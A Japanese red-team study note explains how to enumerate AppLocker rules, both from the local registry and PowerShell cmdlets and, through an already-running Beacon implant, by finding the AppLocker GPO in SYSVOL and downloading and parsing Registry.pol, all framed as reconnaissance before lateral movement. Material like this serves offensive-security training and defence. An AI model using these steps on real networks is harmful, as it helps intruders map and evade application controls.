AppLockerポリシーは2つの場所から列挙可能: GPO、ローカルレジストリ

## レジストリ
`HKLM\Software\Policies\Microsoft\Windows\SrpV2`に格納されていて、ポリシー種類ごとにサブキーに分岐。各ルールはXML文字列形式で保存
```powershell
PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'

    Hive: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2

Name                           Property
----                           --------
Appx                           EnforcementMode : 1
                               AllowWindows    : 0
Dll                            AllowWindows : 0
Exe                            EnforcementMode : 1
                               AllowWindows    : 0
Msi                            EnforcementMode : 1
                               AllowWindows    : 0
Script                         EnforcementMode : 1
                               AllowWindows    : 0

PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'

    Hive: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe

Name                           Property
----                           --------
921cc481-6e17-4653-8f75-050b80 Value : <FilePathRule Id="921cc481-..." .../>
...
```

AppLockerコマンドレットを利用する方法
```powershell
PS C:\Users\pchilds> $policy = Get-AppLockerPolicy -Effective
PS C:\Users\pchilds> $policy.RuleCollections

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```

## GPO
保護されていないマシン上ですでにBeaconを動作させているが、保護されたマシンへラテラルムーブメントを試みている状況で有効

- すべてのGPOを列挙して名前から判断
- SYSVOL内の各コンテナを探索、Machineディレクトリ内の`Registry.pol`ファイルを探す方法

```
beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath

--------------------
displayName: AppLocker
gPCFileSysPath: \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}
--------------------

beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-...}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/29/2025 10:47:29   Microsoft
          dir     03/29/2025 10:47:27   Scripts
 8kb      fil     03/29/2025 10:48:02   Registry.pol

beacon> download \\contoso.com\SysVol\...\Registry.pol
[*] started download of Registry.pol (8216 bytes)
[*] download of Registry.pol is complete
```

ファイルをダウンロードしたら、`GpRegistryPolicy` モジュールの `Parse-PolFile` コマンドレットを使用してファイルを読み取る
```
PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol

KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\921cc481-...
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 736
ValueData   : <FilePathRule Id="921cc481-..." Name="(Default Rule) All files located in the
              Program Files folder" ... Action="Allow">...</FilePathRule>
```